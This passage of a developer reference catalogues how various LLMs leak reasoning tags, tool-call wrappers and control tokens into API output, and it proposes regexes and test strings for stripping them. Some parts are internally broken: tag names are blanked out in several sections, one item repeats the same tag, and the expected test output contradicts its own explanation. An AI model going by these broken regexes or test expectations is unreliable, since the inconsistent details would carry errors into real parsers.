2. **AssemblyAI** Speech-to-Text has a "tag-stripping guardrail" that filters stray markup tokens from transcripts.
3. Several content moderation tools (e.g. openclaw inbound) strip re-formed HTML tags.

None of these affect the Claude API response text. The closest Anthropic-specific leaked XML is the `<antml:thinking>` and `<antml:function_calls>` *prompt annotations* shown in §2.1.

**Sources:** [claude-mem: Private Tags](https://docs.claude-mem.ai/usage/private-tags), [AssemblyAI changelog](https://www.assemblyai.com/changelog), [openclaw GitHub release](https://newreleases.io/project/github/openclaw/openclaw/release/v2026.4.29).
**Handling:** Optional belt-and-suspenders regex for `<antml:[a-z_]+>…</antml:[a-z_]+>`.

Test-case string:

```
<antml:function_calls>
<antml:invoke name="get_weather">
<antml:parameter name="city">Paris</antml:parameter>
</antml:invoke>
</antml:function_calls>
```

This pattern appears in the prompt verbatim, almost never in `content` — but defensive stripping is cheap.

---

## 12. OpenAI o-series reasoning — **separate field, never leaks**

> *[Documented, well-cross-checked]* — `o1`, `o3`, `o4-mini`, `gpt-5`, `gpt-5-mini` etc. return `reasoning_content` (or `reasoning_summary` in Responses API) as a **separate field** from `content`. The reasoning text is never emitted inside `<thinking>` markup in the model-visible content.

Because of this, the inconsistency is in **which field is populated**:

- `grok-4.3`-style: during thinking, only `reasoning_content` is present; during answer, only `content`.
- `qwen3.6-plus`-style: both keys present, inactive one is `null`.
- `glm-5.1`-style: during thinking, `content=""` (empty string) while `reasoning_content` carries text.

**Sources:** [OpenAI Reasoning models docs](https://developers.openai.com/api/docs/guides/reasoning), [OpenAI community: reasoning_content availability](https://community.openai.com/t/reasoning-no-longer-available-in-api-responses/1116490), [APIYI Reasoning Models](https://docs.apiyi.com/en/api-capabilities/openai/reasoning-models), [simonwillison: Responses API streaming](https://community.openai.com/t/responses-api-streaming-the-simple-guide-to-events/1363122).
**Handling:** **Read `reasoning_content` if present, render as collapsible thinking.** Never rely on stripping. The unified check is `if delta.content:` and `if getattr(delta, "reasoning_content", None):` with truthiness taking care of all three missing-key cases.

---

## 13. Mistral reasoning / function-call formats

> *[Documented]* — Already covered in §3.5 (`[TOOL_CALLS]`) and §9.4 (`[INST]`). The `Magistral` reasoning model (Mistral) emits `…` / `…` tags. Treat as §1.1.

**Sources:** [Mistral AI cookbook](https://docs.mistral.ai/resources/cookbooks/mistral-connectors-05-connectors-in-completions), [Mistral Function Calling docs](https://docs.mistral.ai/studio-api/conversations/function-calling).
**Handling:** Covered.

---

## 14. Cohere / Command R+ citations

> *[Documented, already covered in §5.1]* — Cohere emits citations as a separate `citations` field; `[co:cite]` markup is only in the human-readable annotated variant, not the API. **No inline markup to strip.**

**Sources:** [Cohere RAG Citations](https://docs.cohere.com/docs/rag-citations), [Cohere tool-use citations](https://docs.cohere.com/docs/tool-use-citations), [Cohere Command R model card](https://docs.cohere.com/docs/command-r).
**Handling:** None.

---

## 15. xAI Grok — `<reasoning>` and `<xai:function_call>`

> *[Documented + empirical]* — Grok's standard API uses `reasoning_content` (separate field) for thinking. The leaked Grok 4 system prompt instructs the model to emit `<xai:function_call>` for tool calls. Also documented: `<xai:reasoning>` appears in some leaked prompts.

**Sources:** [xAI Tools Overview](https://docs.x.ai/developers/tools/overview), [asgeirtj/system_prompts_leaks: xAI/grok-4.md](https://github.com/asgeirtj/system_prompts_leaks/blob/main/xAI/grok-4.md), [asgeirtj/system_prompts_leaks: xAI/grok-build.md](https://github.com/asgeirtj/system_prompts_leaks/blob/main/xAI/grok-build.md).
**Handling:** **Strip** `<xai:reasoning>…</xai:reasoning>` and `<xai:function_call>…</xai:function_call>` (single tag, no `s`). Add to the wrapper alternation.

---

## 16. Google Gemini — `start_of_turn` / `end_of_turn` / citations

> *[Documented]* — Gemini's API uses `annotations` for citations (§5.2). The Gemma sub-family uses `<start_of_turn>` / `<end_of_turn>` tokens (§9.5). The `<unusedNN>` placeholder tokens are specific to Gemini's vocab and only appear in raw pre-tokenized prompts.

**Sources:** [Gemma prompt structure](https://ai.google.dev/gemma/docs/core/prompt-structure), [Gemini File Search docs](https://ai.google.dev/gemini-api/docs/file-search), [Gemini prompting strategies](https://ai.google.dev/gemini-api/docs/prompting-strategies).
**Handling:** **Strip** `<start_of_turn>` / `<end_of_turn>` (covered in §9.5). `<unusedNN>` placeholders are essentially never seen in API output.

---

## 17. DeepSeek — see §1.2 / §3.2

Full-width-pipe `｜`, `◁think▁…◁/think▁` markers. Already covered.

---

## 18. Qwen / QwQ / Qwen3 — see §1.3 / §1.4 / §9.3

`think` tag, `im_start` / `im_end` mix. Already covered.

---

## 19. Llama 3 / 3.1 / 3.2 / 3.3 — see §9.1

`begin_of_text`, `end_of_text`, `start_header_id`, `end_header_id`, `eot_id`, `eom_id`, `python_tag`. Already covered.

---

## 20. Phi-3 / Phi-4 — see §9.2

`user`, `assistant`, `system`, `end`, `endoftext`, `im_end`. Already covered.

---

## 21. Other real-world quirks

### 21.1 Trailing newlines / blank lines from reasoning models

> *[Empirical, single source]* — Qwen3, DeepSeek-R1, GLM-4.5 emit 2–4 leading blank lines after a `…` close tag. One proxy explicitly documents this as something to strip:

> "minimax-m2 reasoning output leaks blank lines; .lstrip() at the source covers /chat, /v1/chat/completions, and the MCP chat tool."

**Source:** [Pratik/knowledge-base commits](https://git.pratiknarola.com/pratik/knowledge-base/commits/commit/ea07a82bd794da6e9ae9696d2d51ddc34dff4667).
**Handling:** Already covered by `tidy()`'s `replacingOccurrences(of: "\n{3,}", with: "\n\n")` plus `.trimmingCharacters`.

### 21.2 Stray `Wait, let me reconsider…` mid-answer

> *[Empirical]* — Some reasoning models start emitting a second thinking block mid-answer (`Wait, I should also consider…`). The model never closes it before streaming ends.

**Sources:** [GLM-4.5 discussion #9](https://huggingface.co/zai-org/GLM-4.5/discussions/9), [Qwen3 #17349](https://github.com/vllm-project/vllm/issues/17349).
**Handling:** `openOnlyPattern` already handles unclosed thinking tags. ✅

### 21.3 Markdown bullets that re-introduce list markers

> *[Empirical]* — Reasoning models when asked for a CSV sometimes emit:

```
1. apple
2. banana
3. cherry
```

The number prefix is the model not knowing we're in non-thinking mode. **Render as a list**, don't strip.

### 21.4 `<scratch_pad>` (Hermes 4)

> *[Documented]* — Hermes 4 distinguishes internal scratch from final answer:

```
<scratch_pad>
The user wants weather.
I should call get_weather.
</scratch_pad>
<tool_call>
{"name": "get_weather", "arguments": {"city": "Paris"}}
</tool_call>
```

**Sources:** [vLLM Hermes2ProToolParser](https://docs.vllm.ai/en/latest/api/vllm/tool_parsers/hermes_tool_parser/), [Hermes Agent trajectory format](https://hermes-agent.nousresearch.com/docs/developer-guide/trajectory-format).
**Handling:** **Strip** `<scratch_pad>…</scratch_pad>` blocks. Lower priority.

### 21.5 XML echo from prompt

> *[Empirical]* — When the user pastes a chunk of XML into the prompt, models occasionally echo the closing tags back verbatim:

```
User: Here's my config: <config>...</config>
Assistant: It looks like your config is `<config>`-based. Let me …
```

**Sources:** [Anthropic XML tag best practices](https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/claude-prompting-best-practices).
**Handling:** This is legitimate content, not a protocol leak. **Don't strip.**

### 21.6 `<br>` / `&nbsp;` HTML substitutions

> *[Empirical]* — Some Mistral builds emit raw HTML for whitespace. Not a critical leak.

**Sources:** Reddit r/LocalLLaMA.
**Handling:** Render as Markdown converter.

### 21.7 Emoji that breaks the BYOK flow

> *[Empirical]* — Some models emit a leading invisible character (zero-width space, U+200B) before the first response token. Cosmetic.

**Sources:** Community reports.
**Handling:** Strip in `tidy()`.

### 21.8 `【corrected】` marker (Chinese models)

> *[Empirical, single source]* — Some Qwen fine-tunes for Chinese emit `【corrected】` or `【修改】` markers in edit-mode responses.

**Sources:** Qwen community.
**Handling:** **Don't strip** — they're signal, not noise.

---

## Implementation recommendations (priority order)

These are the concrete changes I'd add to `ThinkingExtractor` (or a sibling helper) in order of impact. Each item lists the existing helper it extends, the regex family to add, and a test case.

### P0 — robust to handling today

Already covered by `stripToolCallXML`.

1. **DeepSeek full-width pipes** — broaden the wrapper alternation to allow `｜` (U+FF5C) inside tag names:

   ```regex
   (｜[a-zA-Z][\w-]*[：:][a-zA-Z][\w-]*｜|[a-zA-Z][\w-]*[：:][a-zA-Z][\w-]*)
   ```

   Test case: `<｜DSML｜function_calls><｜DSML｜invoke name="x"><｜DSML｜parameter name="p">v</｜DSML｜parameter></｜DSML｜invoke></｜DSML｜function_calls>`.

### P1 — high impact, low risk

2. **Hermes singular `tool_call`** — add `tool_call` to the `toolCallWrapperName` alternation. Backreference already handles closing.

   Test case: `<tool_call>{"name":"x","arguments":{}}</tool_call>`.

3. **Anthropic Opus 5 leak** — extend `pairedPattern` to also match `<thinking>` and `<antml:thinking>`. One-line regex change.

   Test case: `<thinking>internal stuff</thinking>actual answer`.

4. **Provider control tokens** — add a `stripControlTokens(from:)` helper that runs before `tidy()`:

   ```regex
   <\|(?:begin_of_text|end_of_text|start_header_id|end_header_id|eot_id|eom_id|python_tag|user|assistant|system|end|endoftext|im_start|im_end)\|>
   ```

   Cases: `<|eot_id|>` slipped mid-answer, `<|im_start|>assistant` leaked between turns.

5. **xAI function call wrapper** — add `xai:function_call` and `xai:tool_call` to the alternation.

   Test case: `<xai:function_call name="search">query</xai:function_call>`.

6. **Gemma turn markers** — add `<start_of_turn>` / `<end_of_turn>` to strip list.

   Test case: `<start_of_turn>modelresponse here<end_of_turn>`.

7. **Mistral `[TOOL_CALLS]` opener** — regex `\b\[TOOL_CALLS\]\s*\[` drops everything until the matching `]` followed by a non-JSON character (heuristic).

   Test case: `[TOOL_CALLS][{"name":"x","arguments":{}}] answer follows`.

### P2 — quality-of-life

8. **Other thinking tag names** — extend `pairedPattern` to include `<reasoning>`, `<reflection>`, `<thought>`, `<analysis>`. Same pattern as `think|thinking`.

9. **DSML explicit wrapper** — add `dsml:function_calls` and `dsml:invoke` to the alternation.

10. **Scratch-pad blocks** — `<scratch_pad>…</scratch_pad>` for Hermes 4.

11. **`<output>` / `<answer>` wrappers** — optional, only if user prompts use them.

12. **Mistral `[INST]` / `[/INST]` orphans** — strip.

### P3 — defensive

13. **`<antml:[a-z_]+>…</antml:[a-z_]+>` generic strip** — one regex covers all `antml:` namespace tags.

14. **`<unused\d+>` Gemini placeholders** — virtually never appears, but cheap.

15. **Leading invisible characters** — U+200B, U+FEFF stripping in `tidy()`.

### What NOT to do

- **Do NOT strip `<thinking>`-style tags for models that put them in a separate content block** (Anthropic, OpenAI o-series). `ThinkingExtractor.extract` already handles this correctly because the server-provided `text` block never contains them.
- **Do NOT strip markdown image syntax** in `ThinkingExtractor`. That's a render-time concern (CSP, allowlist, data-URI stripping).
- **Do NOT auto-strip refusal text** — these are legitimate user-visible content.
- **Do NOT strip JSON ` ```json ` fenced blocks** — they're structured output. Parse them.
- **Do NOT strip `<citation>`/`<cite>` markers** — render them as links.

---

## Quick test-case verifier

If you want to plug these into a Swift / Python regex verifier, here's a single string that combines the most common cases:

```
<analysis>strategy step</analysis>Sure, I can help. <think>now reasoning</think>
Here is the answer.

<minimax:tool_call>
<invoke name="get_weather">
<parameter name="city">Paris</parameter>
</invoke>
</minimax:tool_call>

<scratch_pad>plan</scratch_pad>
<tool_call>{"name":"x","arguments":{"y":1}}</tool_call>
<｜DSML｜function_calls><｜DSML｜invoke name="x"><｜DSML｜parameter name="p">v</｜DSML｜parameter></｜DSML｜invoke></｜DSML｜function_calls>

<antml:thinking>claude's internal</antml:thinking>
<thinking>opus 5 leak</thinking>
<reasoning>reflection</reasoning>

<|im_start|>assistant
<|eot_id|>
<start_of_turn>model<end_of_turn>

[TOOL_CALLS][{"name":"x","arguments":{}}]
[INST]forbidden[/INST]

Final Answer: 42
```

Expected output after the recommended P0+P1 strippers:

```
Sure, I can help.
Here is the answer.

42
```

(Reasoning/text-content blocks removed; tool-call wrappers removed; control tokens removed; `Final Answer:` prefix appended to the answer.)

---

## References (full list)

- Anthropic: [Thinking](https://platform.claude.com/docs/en/build-with-claude/thinking), [Extended Thinking](https://platform.claude.com/docs/en/build-with-claude/extended-thinking), [Troubleshooting thinking](https://platform.claude.com/docs/en/build-with-claude/thinking-troubleshooting), [Refusals](https://platform.claude.com/docs/en/build-with-claude/refusals-and-fallback), [streaming refusals](https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/handle-streaming-refusals), [XML prompting best practices](https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/claude-prompting-best-practices)
- AWS Bedrock: [Claude extended thinking](https://docs.aws.amazon.com/bedrock/latest/userguide/claude-messages-extended-thinking.html)
- Vercel AI Gateway: [Anthropic reasoning](https://vercel.com/docs/ai-gateway/sdks-and-apis/anthropic-messages-api/reasoning)
- OpenAI: [Reasoning models](https://developers.openai.com/api/docs/guides/reasoning), [Streaming](https://platform.openai.com/docs/api-reference/chat/streaming), [Streaming completions cookbook](https://developers.openai.com/cookbook/examples/how_to_stream_completions), [community: reasoning_content](https://community.openai.com/t/reasoning-no-longer-available-in-api-responses/1116490), [community: Responses API streaming](https://community.openai.com/t/responses-api-streaming-the-simple-guide-to-events/1363122)
- APIYI: [Reasoning Models](https://docs.apiyi.com/en/api-capabilities/openai/reasoning-models)
- DeepSeek: [DeepSeek-R1 GitHub](https://github.com/deepseek-ai/deepseek-r1), [DeepSeek-V4-Pro encoding](https://huggingface.co/deepseek-ai/DeepSeek-V4-Pro/blob/main/encoding/README.md), [LessWrong: Anomalous tokens](https://www.lesswrong.com/posts/xtpcJjfWhn3Xn8Pu5/anomalous-tokens-in-deepseek-v3-and-r1), [ktransformers #129](https://github.com/kvcache-ai/ktransformers/issues/129)
- vLLM: [DeepSeek R1 reasoning parser](https://docs.vllm.ai/en/stable/api/vllm/reasoning/deepseek_r1_reasoning_parser/), [Hermes2ProToolParser](https://docs.vllm.ai/en/latest/api/vllm/tool_parsers/hermes_tool_parser/), [Mistral parser](https://docs.vllm.ai/en/stable/api/vllm/parser/mistral/), [MinimaxM2 parser](https://docs.vllm.ai/en/latest/api/vllm/parser/minimax_m2/), [issue #17349](https://github.com/vllm-project/vllm/issues/17349), [issue #31319](https://github.com/vllm-project/vllm/issues/31319), [issue #15125](https://github.com/vllm-project/vllm/issues/15125)
- Qwen: [Qwen Key Concepts](https://qwen.readthedocs.io/en/latest/getting_started/concepts.html), [Qwen3 GitHub](https://github.com/QwenLM/Qwen3), [Qwen/QwQ-32B discussion #4](https://huggingface.co/Qwen/QwQ-32B/discussions/4), [Qwen3-1.7B discussion #11](https://huggingface.co/Qwen/Qwen3-1.7B/discussions/11), [Qwen3-Coder-Next report](https://arxiv.org/pdf/2603.00729), [lyn.one: Qwen3.5 infinite thinking](https://lyn.one/reasoning-control-flow)
- GLM: [GLM-4.5 discussion #9](https://huggingface.co/zai-org/GLM-4.5/discussions/9), [Z.AI thinking docs](https://docs.z.ai/guides/capabilities/thinking), [Z.AI stream-tool docs](https://docs.bigmodel.cn/cn/guide/capabilities/stream-tool), [zhipu-32152247 GLM-4.5](https://zhipu-32152247.mintlify.app/guides/llm/glm-4.5)
- Mistral: [Function Calling docs](https://docs.mistral.ai/studio-api/conversations/function-calling), [Mistral Connectors cookbook](https://docs.mistral.ai/resources/cookbooks/mistral-connectors-05-connectors-in-completions), [Mistral-7B v0.3 discussion #68](https://huggingface.co/mistralai/Mistral-7B-Instruct-v0.3/discussions/68)
- Hermes / NousResearch: [Hermes Agent trajectory format](https://hermes-agent.nousresearch.com/docs/developer-guide/trajectory-format), [Hermes 2 Pro model card](https://huggingface.co/NousResearch/Hermes-2-Pro-Llama-3-8B), [Hermes 3 Function Calling Guide](https://fast.io/resources/hermes-3-function-calling-guide/)
- Llama 3 / Meta: [Meta Llama 3 special tokens](https://www.genspark.ai/spark/special-tokens-used-with-meta-llama-3/), [Meta Llama 3 GitHub issue #104](https://github.com/meta-llama/llama3/issues/104), [torchtune Llama3 tokenizer](https://docs.pytorch.org/torchtune/0.2/_modules/torchtune/models/llama3/_tokenizer.html), [Ollama issue #3759](https://github.com/ollama/ollama/issues/3759)
- Phi: [Phi-4 bug fixes](https://www.reddit.com/r/MachineLearning/comments/1i23zbo/p_how_i_found_fixed_4_bugs_in_microsofts_phi4/), [llama.cpp issue #7432](https://github.com/ggml-org/llama.cpp/issues/7432), [GPT4All issue #2271](https://github.com/nomic-ai/gpt4all/issues/2271), [Simon Willison: special tokens](https://simonwillison.net/2024/Aug/20/sql-injection-like-attack-on-llms-with-special-tokens/)
- Gemma: [Gemma core prompt structure](https://ai.google.dev/gemma/docs/core/prompt-structure), [Gemma 4 prompt formatting](https://ai.google.dev/gemma/docs/core/prompt-formatting-gemma4)
- Gemini: [google_search docs](https://ai.google.dev/gemini-api/docs/google-search), [File Search docs](https://ai.google.dev/gemini-api/docs/file-search), [prompting strategies](https://ai.google.dev/gemini-api/docs/prompting-strategies), [support thread #351560557](https://support.google.com/gemini/thread/351560557), [support thread #386444003](https://support.google.com/gemini/thread/386444003)
- Cohere: [RAG Citations](https://docs.cohere.com/docs/rag-citations), [Tool-use citations](https://docs.cohere.com/docs/tool-use-citations), [Grounded summarization](https://docs.cohere.com/page/grounded-summarization), [Command R](https://docs.cohere.com/docs/command-r)
- xAI: [Function Calling](https://docs.x.ai/developers/tools/function-calling), [Tools Overview](https://docs.x.ai/developers/tools/overview), [system_prompts_leaks: grok-4.md](https://github.com/asgeirtj/system_prompts_leaks/blob/main/xAI/grok-4.md), [system_prompts_leaks: grok-build.md](https://github.com/asgeirtj/system_prompts_leaks/blob/main/xAI/grok-build.md)
- MiniMax M2: [docs/MiniMax-M2.7 tool_calling_guide](https://github.com/MiniMax-AI/MiniMax-M2.7/blob/main/docs/tool_calling_guide.md), [MiniMax-M2.5 commit](https://huggingface.co/MiniMaxAI/MiniMax-M2.5/commit/5fb9455421adc47f561f139d4e925b4c88c44367), [SylphAI blog](https://blog.sylph.ai/posts/ultimate-guide-agentic-tool-calling)
- Math / LaTeX: [OpenAI "$ escaped" bug](https://community.openai.com/t/all-are-escaped-in-math-latex-notation/1250516), [genai.stackexchange: ChatGPT math](https://genai.stackexchange.com/questions/386/how-does-chatgpt-render-math-in-markdown-output), [assistant-ui LaTeX](https://www.assistant-ui.com/docs/guides/latex), [Obsidian Fix Math](https://community.obsidian.md/plugins/fix-math)
- Security: [Prompt Injection payloads: markdown exfil](https://www.promptinjectionpayloads.com/en/blog/data-exfiltration-via-markdown-images), [Wraith: markdown exfil](https://wraith.sh/learn/markdown-image-exfiltration), [Trackr: SearchLeak CVE](https://www.trackr.live/2026/07/20/llm-markdown-image-exfiltration-egress-detection/), [Simon Willison: exfiltration attacks](https://simonwillison.net/tags/exfiltration-attacks/)
- Tool-call leakage: [LiveKit: serving stack](https://livekit.com/blog/your-model-isnt-bad-at-tool-calling), [OpenClaw vLLM docs](https://docs.openclaw.ai/providers/vllm), [Ollama issue #7014](https://github.com/ollama/ollama/issues/7014), [NVIDIA NIM: DSML tool calls](https://forums.developer.nvidia.com/t/deepseek-v4-pro-v4-flash-on-nvidia-nim-streaming-tool-calls-do-not-continue-in-claude-code-anthropic-compatible-agent-workflow/368085)
- Refusal benchmarks: [FinHarmBench](https://aclanthology.org/2026.acl-industry.117.pdf), [Prompt Injection Refusal Boundary](https://arxiv.org/pdf/2601.17911)
- Anthropic tag stripping: [claude-mem private tags](https://docs.claude-mem.ai/usage/private-tags), [AssemblyAI changelog](https://www.assemblyai.com/changelog), [openclaw release](https://newreleases.io/project/github/openclaw/openclaw/release/v2026.4.29), [Kara's Nonsense: ANTML](https://karashiiro.leaflet.pub/3m4gf7geefs2l)
- Streaming / SSE: [Streaming with tool calls](https://habitualcs.io/post/streaming-with-tool-calls-real-time-agentic-loops-in-anthropic-and-openai-apis), [Anthropic SSE parsing](https://dev.to/gabrielanhaia/streaming-tool-calls-parse-anthropic-sse-without-loading-the-whole-message-2on)
- Multi-line tool-call examples: [Hermes Agent trajectory](https://hermes-agent.nousresearch.com/docs/developer-guide/trajectory-format)

